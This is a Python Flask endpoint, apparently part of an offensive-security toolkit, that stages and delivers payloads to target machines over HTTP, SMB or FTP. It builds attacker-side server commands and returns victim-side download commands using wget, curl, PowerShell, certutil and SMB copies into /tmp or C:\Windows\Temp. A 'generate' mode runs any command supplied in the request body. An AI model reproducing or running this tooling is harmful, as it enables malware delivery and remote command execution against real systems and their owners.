@app.route("/api/tools/payload-staging", methods=["POST"])
def payload_staging():
    """Stage and deliver payloads via multiple protocols (HTTP, SMB, FTP)"""
    try:
        params = request.get_json(silent=True) or {}
        payload_path = params.get("payload_path", "")
        staging_method = params.get("staging_method", "http")
        lhost = params.get("lhost", "")
        lport = params.get("lport", "8080")
        target = params.get("target", "")
        delivery_command = params.get("delivery_command", "")
        additional_args = params.get("additional_args", "")

        if not staging_method:
            return jsonify({"error": "staging_method parameter is required"}), 400

        results = {"staging_method": staging_method, "success": True}

        if staging_method == "http":
            if not payload_path:
                return jsonify({"error": "payload_path required for HTTP staging"}), 400
            import os as _os
            payload_dir = _os.path.dirname(payload_path) or "."
            cmd = f"python3 -m http.server {lport} --directory {payload_dir}"
            results["server_command"] = cmd
            results["download_commands"] = {
                "wget": f"wget http://{lhost}:{lport}/{_os.path.basename(payload_path)} -O /tmp/payload",
                "curl": f"curl http://{lhost}:{lport}/{_os.path.basename(payload_path)} -o /tmp/payload",
                "powershell": f"Invoke-WebRequest -Uri http://{lhost}:{lport}/{_os.path.basename(payload_path)} -OutFile payload.exe",
                "certutil": f"certutil -urlcache -split -f http://{lhost}:{lport}/{_os.path.basename(payload_path)} payload.exe"
            }
        elif staging_method == "smb":
            cmd = f"impacket-smbserver share {payload_path} -smb2support"
            results["server_command"] = cmd
            results["download_commands"] = {
                "cmd": f"copy \\\\{lhost}\\share\\payload.exe C:\\Windows\\Temp\\payload.exe",
                "powershell": f"Copy-Item -Path \\\\{lhost}\\share\\payload.exe -Destination C:\\Windows\\Temp\\payload.exe"
            }
        elif staging_method == "ftp":
            cmd = f"python3 -m pyftpdlib -p {lport} -d {payload_path} -w"
            results["server_command"] = cmd
            results["download_commands"] = {
                "ftp": f"ftp {lhost} {lport}",
                "wget": f"wget ftp://{lhost}:{lport}/payload -O /tmp/payload"
            }
        elif staging_method == "generate":
            if not delivery_command:
                return jsonify({"error": "delivery_command required for generate mode"}), 400
            results["executed"] = execute_command(delivery_command)
        else:
            return jsonify({"error": f"Unknown staging method: {staging_method}"}), 400

        results["timestamp"] = datetime.now().isoformat()
        logger.info(f"📦 Payload staging via {staging_method} configured")
        return jsonify(results)
    except Exception as e:
        logger.error(f"💥 Error in payload-staging endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500


